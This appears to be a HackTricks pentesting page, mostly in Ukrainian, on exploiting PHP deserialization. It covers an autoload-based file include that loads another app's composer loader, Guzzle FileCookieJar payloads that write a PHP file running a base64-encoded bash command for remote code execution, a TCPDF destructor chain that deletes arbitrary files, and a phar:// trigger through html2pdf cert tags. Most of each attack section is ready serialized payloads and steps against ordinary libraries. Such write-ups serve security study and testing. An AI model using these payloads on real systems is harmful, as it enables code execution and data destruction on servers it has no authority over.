# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Спочатку перевірте, що таке [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Ми в ситуації, коли знайдено **PHP deserialization in a webapp** без бібліотеки, вразливої до гаджетів у **`phpggc`**. Однак в тому ж контейнері був **інший composer webapp з вразливими бібліотеками**. Тому мета була — **завантажити composer loader іншого webapp** і зловживати ним, щоб **завантажити gadget, який експлуатує цю бібліотеку** з webapp, вразливого до десеріалізації.

Кроки:

- Ви знайшли **deserialization** і в поточному коді додатку **немає жодного gadget**
- Ви можете зловживати функцією **`spl_autoload_register`** наступним чином, щоб **завантажити будь-який локальний файл з розширенням `.php`**
- Для цього ви використовуєте deserialization, де ім'я класу буде у **`$name`**. Ви **не можете використовувати "/" або "."** в імені класу в серіалізованому об'єкті, але **код** **замінює** **underscores** ("\_") **на слеші** ("/"). Тому ім'я класу, наприклад `tmp_passwd`, буде перетворено в `/tmp/passwd.php` і код спробує його завантажити.\
Приклад **gadget** буде: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> Якщо у вас є **file upload** і ви можете завантажити файл з **`.php` extension`**, ви можете **abuse this functionality directly** і одразу отримати RCE.
> 
> У моєму випадку такого не було, але в **same container** знаходився інший веб-застосунок на composer з бібліотекою, вразливою до `phpggc` gadget.
> 
> - Щоб завантажити цю іншу бібліотеку, спочатку потрібно **load the composer loader of that other web app** (бо loader поточного застосунку не дає доступу до бібліотек іншого). **Knowing the path of the application**, це дуже просто зробити за допомогою: **`O:28:"www_frontend_vendor_autoload":0:{}`** (У моєму випадку, composer loader був у `/www/frontend/vendor/autoload.php`)
> - Тепер ви можете **load** composer loader іншого додатку, тож час **`generate the phpgcc`** **payload** для використання. У моєму випадку я використав **`Guzzle/FW1`**, що дозволило мені **write any file inside the filesystem**.
> - NOTE: Згенерований gadget не працював — щоб він запрацював, я **modified** payload `chain.php` phpggc і встановив усі атрибути класів **from private to public**. Інакше після десеріалізації рядка атрибути створених об’єктів не мали жодних значень.
> - Тепер ми вміємо **load the others app composer loader** і маємо **phpggc payload that works**, але потрібно **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. Для цього я відправив серіалізований масив з обома об’єктами, наприклад:
> - Ви бачите **first the loader being loaded and then the payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Тепер ми можемо **створити та записати файл**, проте користувач **не міг записувати в жодну папку всередині web server**. Як видно в payload, PHP, що викликає **`system`** з деяким **base64**, створюється в **`/tmp/a.php`**. Потім ми можемо **повторно використати перший тип payload**, який ми використовували як LFI, щоб завантажити composer loader іншого webapp і **завантажити згенерований `/tmp/a.php`** файл. Просто додайте його в deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**Підсумок payload**

- **Load the composer autoload** іншого webapp у тому ж контейнері
- **Load a phpggc gadget** щоб зловживати бібліотекою з іншого webapp (початковий webapp, вразливий до десеріалізації, не мав відповідного gadget у своїх бібліотеках)
- Гаджет **create a file with a PHP payload** в ньому в /tmp/a.php з шкідливими командами (користувач webapp не може записувати в жодну папку жодного webapp)
- Остання частина нашого payload використає **load the generated php file**, який виконає команди

Мені потрібно було **call this deserialization twice**. Під час тестування перший раз файл `/tmp/a.php` був створений, але не завантажений, а другий раз він був завантажений правильно.

## TCPDF `__destruct` POP chain для довільного видалення файлів

Коли справжній екземпляр `TCPDF` підлягає збиранню сміття, він викликає `_destroy(true)`, перебирає `$this->imagekeys` і викликає `unlink()` для всього, що виглядає як кеш-файл під `K_PATH_CACHE`. Якщо додаток виконує `unserialize($user_data)` під час завантаженої класу `TCPDF` (наприклад, очікує масив з ключем `html`), ви можете надати серіалізований об'єкт, який встановлює:

- `file_id` до будь-якого цілого, якого немає в `self::$cleaned_ids` (наприклад `-1`).
- `imagekeys` до шляхів, які починаються з `K_PATH_CACHE` або які можна зробити схожими на нього (наприклад `/tmp/../tmp/do_not_delete_this_file.txt`, коли `K_PATH_CACHE` є `/tmp/`).

Приклад payload, що таргетує небезпечний `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` потік:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
The file is deleted as soon as the object falls out of scope. TCPDF 6.9.3 tightened the check to only remove paths with the `__tcpdf_<file_id>_` prefix inside `K_PATH_CACHE` and introduced `_unlink()` to block non-`file://` schemes, so older `Producer` versions are prime targets.

### Triggering the gadget via `phar://` in html2pdf `<cert>` tags

`spipu/html2pdf` (≤5.3.0) обгортає TCPDF і надає користувацький блок `<cert>`, атрибути `src`/`privkey` якого перевіряються простим `file_exists()`. На PHP < 8.0 будь-яка файлово-системна функція, яка торкається URL `phar://`, спричиняє unserialize() метаданих Phar. Помістивши згаданий вище шкідливий об'єкт TCPDF у Phar-архів, ви отримуєте надійний POP навіть якщо застосунок ніколи сам не викликає `unserialize()`.

1. Створіть Phar з `phar.readonly=0`, налаштуйте stub/manifest так, щоб він виглядав як зображення (наприклад перейменуйте `archive.phar` на `archive.png`), і збережіть серіалізований об'єкт TCPDF у метаданих Phar.
2. Завантажте/розмістіть файл у доступному місці, наприклад `/tmp/user_files/user_1/archive.png`.
3. Надішліть HTML, що містить тег `<cert>`, щоб html2pdf розв'язав шлях, контрольований атакуючим:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Виклик `file_exists()` десеріалізує метадані, створює екземпляр TCPDF, а його деструктор видаляє обраний файл, перетворюючи html2pdf на потужну точку входу `phar://`. У версії 5.3.1 додано `Security::checkValidPath()` для блокування непогоджених схем, тому застарілі розгортання залишаються привабливими.

## References

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
